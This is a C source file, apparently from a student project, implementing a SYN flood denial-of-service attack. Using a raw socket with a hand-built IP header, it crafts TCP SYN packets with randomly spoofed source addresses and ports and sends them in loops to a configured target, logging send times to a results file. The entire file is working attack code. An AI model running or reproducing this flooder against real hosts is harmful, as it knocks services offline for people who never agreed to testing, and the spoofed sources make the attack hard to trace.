/**
 * @brief this file contains implementations for DDoS attack
 * @note all declarations explanations are in our header file `Attack.h`
 * @since 30/04/2023
 * @authors Lior Vinman & Yoad Tamar
 */

#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>

#include "Attack.h" // our header


unsigned short calculate_checksum(unsigned short *ptr, int bytes)
{
    long sum = 0;
    unsigned short odd_bytes = 0;
    short answer = 0;

    while(bytes>1)
    {
        sum += *ptr++;
        bytes -= 2;
    }

    if(bytes == 1)
    {
        odd_bytes = 0;
        *((u_char*)&odd_bytes) = *(u_char*)ptr;
        sum += odd_bytes;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return answer;
}

char *get_random_ipv4(int sock, FILE *f)
{
    char *ipv4 = NULL;
    ipv4 = (char*)calloc(IP_ADDR_LEN, sizeof(char));
    if (ipv4 == NULL)
    {
        perror("calloc() failed");

        close(sock);

        fclose(f);
        f = NULL;

        exit(errno);
    }

    sprintf(ipv4, "%d.%d.%d.%d", (rand() % 256), (rand() % 256), (rand() % 256), (rand() % 256));

    return ipv4;
}

int get_random_port()
{
    return (int)(rand() % (65535 - 1024 + 1) + 1024);
}

int main (int argc, char *argv[])
{
    srand(time(NULL));

    int sock = 0;
    sock = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock <= 0)
    {
        perror("socket() failed");
        exit(errno);
    }

    int optval = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0)
    {
        perror("setsockopt() failed");
        close(sock);
        exit(errno);
    }

    FILE *file = NULL;
    file = fopen(RESULTS_FILE, "w");
    if (file == NULL)
    {
        perror("fopen() failed");
        close(sock);
        exit(errno);
    }

    char syn_pkt[SYN_PACKET_SIZE] = {0}, *ipv4 = NULL;
    memset(syn_pkt, 0, SYN_PACKET_SIZE);

    struct iphdr *iph = NULL;
    iph = (struct iphdr*)syn_pkt;

    struct tcphdr *tcph = NULL;
    tcph = (struct tcphdr*)(syn_pkt + sizeof(struct ip));

    socklen_t addr_len = sizeof(struct sockaddr_in);
    struct sockaddr_in target_addr = {0};
    memset(&target_addr, 0, addr_len);
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(TARGET_IP_ADDR);
    target_addr.sin_port = htons(TARGET_PORT);

    struct pseudo_header psh = {0};
    memset(&psh, 0, sizeof(struct pseudo_header));

    ssize_t bytes_sent = 0;

    double avg = 0.0;

    struct timeval start = {0}, end = {0};
    memset(&start, 0, sizeof(struct timeval));
    memset(&end, 0, sizeof(struct timeval));


    int i = 0, j = 0;

    for(i = 0; i < NUM_ITERATIONS; i++)
    {
        for(j = 0; j < NUM_PACKETS; j++)
        {
            memset(syn_pkt, 0, SYN_PACKET_SIZE);

            ipv4 = get_random_ipv4(sock, file);

            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
            iph->id = htons(54321);
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            iph->saddr = inet_addr (ipv4);
            iph->daddr = target_addr.sin_addr.s_addr;
            iph->check = calculate_checksum((unsigned short*)syn_pkt, iph->tot_len >> 1);

            tcph->source = htons (get_random_port());
            tcph->dest = htons (80);
            tcph->seq = 0;
            tcph->ack_seq = 0;
            tcph->doff = 5;
            tcph->fin=0;
            tcph->syn=1;
            tcph->rst=0;
            tcph->psh=0;
            tcph->ack=0;
            tcph->urg=0;
            tcph->window = htons (8192);
            tcph->check = 0;
            tcph->urg_ptr = 0;

            psh.source_address = inet_addr(ipv4);
            psh.dest_address = target_addr.sin_addr.s_addr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_length = htons(20);
            memcpy(&psh.tcp , tcph , sizeof(struct tcphdr));

            tcph->check = calculate_checksum((unsigned short*)&psh, sizeof(struct pseudo_header));

            gettimeofday(&start, NULL);
            bytes_sent = sendto (sock,syn_pkt,iph->tot_len,0,(struct sockaddr*)&target_addr, addr_len);
            gettimeofday(&end, NULL);

            while (bytes_sent < 0)
            {
                gettimeofday(&start, NULL);
                bytes_sent = sendto (sock,syn_pkt,iph->tot_len,0,(struct sockaddr*)&target_addr, addr_len);
                gettimeofday(&end, NULL);
            }

            avg += (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0;

            fprintf(file, "%d %f\n", (i * NUM_PACKETS + j), ((end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0));

            free(ipv4);
            ipv4 = NULL;
        }

        fprintf(stdout, "Sent %d packets.\n", (i + 1) * NUM_PACKETS);
    }

    avg /= NUM_ITERATIONS * NUM_PACKETS;
    fprintf(file, "%f", avg);

    close(sock);

    fclose(file);
    file = NULL;

    return 0;
}
